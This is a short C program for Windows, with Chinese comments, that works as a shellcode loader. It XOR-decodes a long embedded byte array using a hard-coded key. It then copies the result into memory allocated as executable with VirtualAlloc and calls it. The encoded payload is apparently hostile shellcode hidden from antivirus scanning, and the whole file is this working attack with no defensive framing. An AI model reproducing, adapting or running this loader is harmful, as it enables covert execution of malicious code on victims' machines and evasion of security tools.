#include <Windows.h>
#include <stdio.h>


void XOR(char* data, size_t data_len, char* key, size_t key_len) {
    int j;
    j = 0;
    // 取payload中的每一位
    for (int i = 0; i < data_len; i++) {
        // 当key长度小于payload长度时，重复使用key值(之前python代码是通过取余实现)
        if (j == key_len - 1) j = 0;

        // 异或计算
        data[i] = data[i] ^ key[j];
        j++;
    }
}
int main()
{
    void* exec_mem;
    unsigned char xpp[] = { 0x31, 0xf9, 0xb6, 0xc8, 0xa4, 0x21, 0xd7, 0x3d, 0x49, 0x68, 0x49, 0x15, 0xe8, 0x31, 0xd1, 0xeb, 0x21, 0x72, 0x5a, 0x4b, 0x2e, 0xc0, 0x22, 0xec, 0xf3, 0x3a, 0x49, 0x73, 0x61, 0x12, 0xc0, 0x7, 0xf8, 0xca, 0x14, 0x4b, 0x48, 0x49, 0x9, 0xff, 0xc, 0xf6, 0xf0, 0x36, 0x61, 0x74, 0x49, 0x34, 0xed, 0x3f, 0xfa, 0xf1, 0x4, 0x49, 0x6f, 0x76, 0x2f, 0xe1, 0x1c, 0xd1, 0xd9, 0x47, 0x49, 0x52, 0x64, 0x14, 0xd3, 0xe, 0xec, 0xf0, 0x5d, 0x76, 0x49, 0x68, 0x2f, 0xfa, 0x2c, 0xd2, 0xf3, 0x7c, 0x64, 0x72, 0x5a, 0x2d, 0xc1, 0x1c, 0xc7, 0xce, 0xd, 0x68, 0x49, 0x73, 0x7, 0xfd, 0xc, 0xf8, 0xdd, 0x3e, 0x5a, 0x4b, 0x48, 0x2f, 0xe6, 0x3b, 0xe5, 0xd2, 0x5, 0x73, 0x61, 0x74, 0x2f, 0xdb, 0x31, 0xdc, 0x69, 0x8b, 0x2e, 0xc0, 0x2a, 0xc6, 0xc4, 0x25, 0xd1, 0x22, 0x89, 0xb, 0x4b, 0x52, 0x64, 0xf1, 0x9e, 0x4f, 0xc1, 0xc, 0x93, 0xb0, 0xc, 0xdc, 0xe, 0xb5, 0x24, 0xc1, 0x2c, 0x94, 0x21, 0xc4, 0x2e, 0x8d, 0xd, 0xfe, 0x3f, 0xb0, 0xc, 0xd0, 0x3b, 0xb5, 0x24, 0xcd, 0x26, 0x94, 0x21, 0xc8, 0x39, 0x8d, 0xd, 0xf2, 0x2e, 0xb0, 0xc, 0xd4, 0x2d, 0xb5, 0x24, 0xc9, 0x2d, 0x94, 0x21, 0xcc, 0x28, 0x8d, 0xd, 0xf6, 0xa, 0xb0, 0xc, 0xa8, 0x3a, 0xb5, 0x24, 0xb5, 0x3a, 0x94, 0x21, 0xb0, 0x5a, 0x8d, 0xd, 0x8d, 0x23, 0xb0, 0xc, 0xad, 0x26, 0xb5, 0x24, 0xb2, 0x28, 0x94, 0x21, 0xb5, 0x3e, 0x8d, 0xd, 0x81, 0x23, 0xb0, 0xc, 0xa1, 0x20, 0xb5, 0x24, 0xbe, 0x2b, 0x94, 0x21, 0xb9, 0x28, 0x8d, 0xd, 0x85, 0xe, 0xb0, 0xc, 0xa5, 0x3b, 0xb5, 0x24, 0xba, 0x30, 0x94, 0x21, 0xbd, 0x1b, 0x8d, 0xd, 0x99, 0x6f, 0xfb, 0x1c, 0xdc, 0x1b, 0xf8, 0x24, 0x88, 0x19, 0xba, 0x38, 0x71, 0x5a, 0x4b, 0xc1, 0xc, 0x9f, 0xfb, 0x4, 0xac, 0x18, 0xf8, 0x34, 0x88, 0x1b, 0xba, 0x28, 0x71, 0x5a, 0x4b, 0xc1, 0xc, 0x97, 0xb0, 0xc, 0x88, 0x3c, 0xb5, 0x24, 0x95, 0x3a, 0x94, 0x21, 0x90, 0x3f, 0x8d, 0xd, 0xaa, 0x1d, 0xb0, 0xc, 0x8c, 0x7a, 0xb5, 0x24, 0x91, 0x7b, 0x94, 0x21, 0x94, 0x74, 0x8d, 0xd, 0xae, 0xb, 0xb0, 0xc, 0x80, 0x25, 0xb5, 0x24, 0x9d, 0x25, 0x94, 0x21, 0x98, 0x5a, 0xc6, 0xd, 0xa9, 0x3f, 0x89, 0x1c, 0x90, 0xc0, 0x36, 0x95, 0xb2, 0xc, 0x86, 0x29, 0xb4, 0x1f, 0x9e, 0x2d, 0x8f, 0x2a, 0xa0, 0x3a, 0xae, 0xc, 0xa4, 0x12, 0xb2, 0xc, 0x8a, 0x5, 0xb4, 0x1f, 0x92, 0x2f, 0x8f, 0x2a, 0xac, 0x2c, 0xae, 0xc, 0xa8, 0x23, 0xb2, 0xc, 0x8e, 0xb, 0xb4, 0x1f, 0x96, 0x30, 0x8f, 0x2a, 0xa8, 0x1e, 0xae, 0xc, 0xac, 0x61, 0xf9, 0x4, 0x86, 0x35, 0xf9, 0xf, 0xbf, 0x1a, 0xb6, 0x3a, 0x86, 0xc0, 0x2d, 0xa5, 0x19, 0x61, 0x1e, 0x49, 0x38, 0x64, 0x18, 0x5a, 0xb4, 0x1d, 0xa5, 0xe4, 0x93, 0x14, 0xab, 0x85, 0xbf, 0xad, 0xb8, 0x85, 0x9e, 0x31, 0xf9, 0xb6, 0xc8, 0xa4, 0x41, 0xa8, 0x33, 0xb1, 0x68, 0x49, 0x73, 0x61, 0xb3, 0xc, 0xae, 0x64, 0x72, 0x5a, 0x4b, 0xa3, 0x40, 0xe4, 0x33, 0xb5, 0xeb, 0x89, 0x72, 0xe8, 0x31, 0xb5, 0xd9, 0x29, 0x7a, 0x59, 0x6, 0xb4, 0x46, 0xd1, 0x67, 0xcc, 0xba, 0x3d, 0x78, 0xea, 0x31, 0xb1, 0xd1, 0xa4, 0x73, 0xd3, 0xe, 0xb0, 0xa2, 0xb0, 0xfd, 0xc, 0x90, 0xc2, 0x96, 0x3c, 0xb7, 0x85, 0x9e, 0x31, 0xf9, 0xb6, 0xc8, 0xa4, 0x41, 0xa8, 0x33, 0xb1, 0x68, 0x49, 0x73, 0x61, 0xb3, 0xc, 0xae, 0x64, 0x72, 0x5a, 0x4b, 0xa3, 0x40, 0xe4, 0x33, 0xb5, 0xeb, 0x89, 0x72, 0xe8, 0x31, 0xb5, 0xd9, 0x29, 0x8e, 0xd1, 0x1e, 0x40, 0x46, 0xd8, 0x72, 0x3, 0xed, 0x89, 0x7, 0x6a, 0xff, 0x4, 0xaa, 0xe7, 0xb3, 0x5b, 0xc2, 0x5, 0xb1, 0x84, 0xa8, 0xc2, 0x2d, 0xb1, 0xf8, 0x84, 0x29, 0x8a, 0x9e, 0x31, 0xf9, 0xb6, 0xc8, 0xa4, 0x45, 0xe4, 0x33, 0x41, 0x38, 0xa1, 0x2, 0x9e, 0x8b, 0xb6, 0xd1, 0xa0, 0x76, 0xd3, 0xe, 0xb0, 0xc2, 0x22, 0x7a, 0x18, 0x80, 0x2b, 0x8c, 0x9e, 0x8b, 0xca, 0x96, 0x60, 0xfb, 0x1f, 0xbf, 0x8f, 0xc, 0x93, 0x76, 0x49, 0x68, 0x49, 0x98, 0x68, 0xff, 0x1c, 0xae, 0xe7, 0xb0, 0x5b, 0xc2, 0x1d, 0xb5, 0xe4, 0x33, 0xb5, 0x53, 0xc, 0x8b, 0x1c, 0x51, 0xc2, 0x1f, 0x98, 0x49, 0x17, 0xbf, 0x35, 0x54, 0xe4, 0x23, 0x41, 0x6b, 0x1c, 0x8f, 0x6e, 0xca, 0x4b, 0xd9, 0x29, 0x7e, 0x59, 0x6, 0xb4, 0x46, 0xd1, 0x67, 0x72, 0xaa, 0x3d, 0x76, 0xe2, 0xbc, 0xb6, 0xb9, 0x60, 0x99, 0x90, 0x78, 0x88, 0xc2, 0x8a, 0x2b, 0x8a, 0xa4, 0x85, 0xbf, 0xad, 0xb8, 0x85, 0x9e, 0x31, 0xf9, 0xb6, 0xc8, 0xa4, 0x45, 0xe4, 0x33, 0x41, 0x38, 0xa1, 0x32, 0x9e, 0x8b, 0xb6, 0xd1, 0xa0, 0x76, 0xd3, 0xe, 0xb0, 0xc2, 0x22, 0x7a, 0x18, 0x80, 0x7b, 0x8c, 0x9e, 0x8b, 0xca, 0x96, 0x60, 0xfb, 0x1f, 0xbf, 0x8f, 0xc, 0x93, 0x76, 0x49, 0x68, 0x49, 0x98, 0x68, 0xff, 0x1c, 0xae, 0xe7, 0xb0, 0x5b, 0xc2, 0x1d, 0xb5, 0xe4, 0x33, 0xb5, 0x53, 0xc, 0x8b, 0x1c, 0x53, 0xc2, 0x1f, 0x98, 0x49, 0x17, 0xbf, 0x35, 0x56, 0xe4, 0x23, 0xb5, 0xe3, 0xc, 0x7b, 0x6e, 0xc3, 0x45, 0x2, 0xef, 0x27, 0xa6, 0xc0, 0xd, 0x45, 0x60, 0xc1, 0x5d, 0x38, 0x72, 0xb9, 0x15, 0x71, 0xca, 0x9a, 0x9b, 0x99, 0x5e, 0xa0, 0x80, 0x7a, 0xaf, 0xfd, 0xac, 0x35, 0x8a, 0xbf, 0xad, 0xb8, 0x85, 0x9e, 0x31, 0xf9, 0xb6, 0xc8, 0xa4, 0x45, 0xb, 0xd7, 0x51, 0x68, 0x49, 0x73, 0xea, 0x34, 0x79, 0xdb, 0x21, 0x86, 0xd1, 0xe, 0xbc, 0xc2, 0x27, 0x7a, 0xc0, 0x25, 0xb1, 0xf8, 0x34, 0x8c, 0xc2, 0x10, 0x68, 0xfb, 0x1f, 0xb7, 0xc3, 0x4, 0x97, 0xfd, 0x1c, 0x94, 0xc2, 0x32, 0x6d, 0x4f, 0x4b, 0x26, 0x4d, 0xf9, 0x17, 0x43, 0x19, 0xc2, 0x3a, 0x8a, 0xc2, 0x2a, 0x79, 0x23, 0x89, 0x3b, 0xb6, 0xad, 0x9b, 0xf1, 0x9e, 0x43, 0xcd, 0x89, 0x1a, 0x7e, 0xc2, 0x25, 0xb5, 0xf8, 0x20, 0x6c, 0xa2, 0x5e, 0xef, 0x27, 0xa6, 0xc0, 0x4a, 0xc0, 0x2a, 0x8a, 0xa2, 0xa2, 0x7a, 0xb3, 0xea, 0x91, 0x14, 0x91, 0x31, 0xf9, 0xb6, 0xc0, 0xd, 0x41, 0x6c, 0x33, 0x45, 0x35, 0x8a, 0xbf, 0xad, 0xb8, 0x85, 0x9e, 0x31, 0xf9, 0xb6, 0xc8, 0xa4, 0x69, 0xe4, 0x33, 0x41, 0xe1, 0xc, 0x87, 0xea, 0x39, 0xbd, 0xd9, 0x35, 0x4e, 0x59, 0x1e, 0x40, 0xc0, 0x3a, 0x86, 0xc2, 0x2d, 0x41, 0x23, 0xd8, 0x7c, 0x49, 0x52, 0x64, 0x19, 0x8b, 0x4b, 0xc3, 0xc, 0x9f, 0xfd, 0x5, 0x78, 0x31, 0x22, 0x89, 0xcb, 0xb6, 0xad, 0x9b, 0xf1, 0x9e, 0x43, 0xc1, 0xc, 0x97, 0xfd, 0x1c, 0x60, 0x1b, 0xf8, 0x24, 0x8c, 0xc2, 0x1a, 0x44, 0x23, 0xb2, 0xe2, 0xb7, 0xb6, 0x90, 0xf5, 0x8d, 0x60, 0xc0, 0x36, 0x8d, 0xff, 0x1c, 0x5a, 0x36, 0xf9, 0x1f, 0xb3, 0xc3, 0x1, 0x4b, 0x27, 0xa1, 0xfb, 0xb6, 0x8c, 0x9e, 0xf7, 0x8d, 0x5a, 0xed, 0x37, 0xbe, 0xc0, 0x1d, 0x41, 0x3d, 0xfd, 0xc, 0x90, 0xc2, 0x3b, 0x7d, 0x25, 0xa1, 0x2f, 0x9b, 0x8d, 0xa5, 0xc8, 0x8c, 0x41, 0xe6, 0x33, 0xa9, 0xaf, 0xc, 0x8f, 0x61, 0x74, 0x49, 0x52, 0x8f, 0x7b, 0xd1, 0x1e, 0xb4, 0xca, 0xad, 0x77, 0xc0, 0x3d, 0xb5, 0xf8, 0x24, 0x8c, 0xc2, 0x1f, 0x98, 0x49, 0x12, 0x53, 0x3b, 0x7, 0xe4, 0x23, 0x41, 0x3a, 0xc2, 0x36, 0x9d, 0xff, 0x4, 0xbe, 0xef, 0x66, 0xdb, 0x19, 0xa0, 0xe, 0x90, 0x89, 0xb6, 0xeb, 0x8d, 0x7b, 0xe8, 0x31, 0xa1, 0xd9, 0x21, 0x7e, 0xa, 0xc0, 0x5, 0xa1, 0x3e, 0x9e, 0xbd, 0x95, 0xb6, 0x8c, 0xe2, 0xb0, 0x41, 0xd7, 0xa4, 0x7, 0x45, 0xc0, 0x1d, 0x41, 0x3d, 0xfd, 0xc, 0x94, 0xc2, 0x3e, 0x85, 0x7b, 0xfe, 0x46, 0x25, 0xf9, 0x1f, 0xab, 0xc3, 0x45, 0xff, 0x27, 0xa1, 0x7b, 0xb6, 0x8c, 0x9e, 0xf7, 0x8d, 0x5a, 0x8f, 0x76, 0xb1, 0xd5, 0x7b, 0x89, 0xe4, 0x93, 0x14, 0xaa, 0x41, 0x73, 0xad, 0xb8, 0x85, 0x9e, 0x31, 0xf9, 0xb6, 0xc8, 0xa4, 0x51, 0xee, 0xb, 0x45, 0x97, 0xb6, 0x73, 0x61, 0x6, 0x58, 0xd9, 0x21, 0x7e, 0xa, 0xc0, 0x5, 0x41, 0x3e, 0x9e, 0xbd, 0x96, 0xb6, 0x8c, 0x8a, 0x1, 0xa2, 0x23, 0xef, 0x27, 0x52, 0xc2, 0x1d, 0xb1, 0xe4, 0x33, 0xb1, 0xe3, 0x1, 0x4f, 0x62, 0x39, 0x41, 0xdb, 0x29, 0x86, 0xd1, 0x1e, 0x40, 0x1b, 0xd7, 0x7e, 0x49, 0x68, 0x49, 0x18, 0xa9, 0x74, 0xc2, 0x7, 0x90, 0xf9, 0x1e, 0x41, 0x30, 0x19, 0x87, 0xc3, 0xb7, 0x97, 0xb6, 0xf0, 0xa5, 0x7c, 0xc0, 0x17, 0x98, 0xf9, 0x17, 0x43, 0x19, 0xc2, 0x3a, 0x8a, 0xc2, 0x2a, 0x55, 0x23, 0x89, 0xeb, 0xb7, 0xad, 0x9b, 0xf1, 0x9e, 0x43, 0xc1, 0xc, 0x83, 0xfd, 0x4, 0x94, 0xc2, 0x22, 0x71, 0xfd, 0x1c, 0xa2, 0xef, 0x37, 0x52, 0x1b, 0xc3, 0x4, 0x63, 0x5d, 0x4, 0x98, 0xc2, 0x26, 0x8d, 0xff, 0x4d, 0xd8, 0x34, 0x9a, 0x20, 0xb5, 0xb7, 0xb6, 0xec, 0xb2, 0x41, 0xe1, 0xc, 0x9b, 0xea, 0x31, 0xa1, 0xb9, 0x66, 0x41, 0x9a, 0xc0, 0xad, 0x14, 0xad, 0x7e };
    unsigned int payload_len = sizeof(xpp);
    unsigned char key[] = "drZKHIovIhIsatIR";
    unsigned int key_len = sizeof(key);


    XOR ((char*)xpp, payload_len, (char*)key, key_len);

    exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    RtlMoveMemory(exec_mem, xpp, payload_len);

    ((void(*)())exec_mem)();

    return 0;
}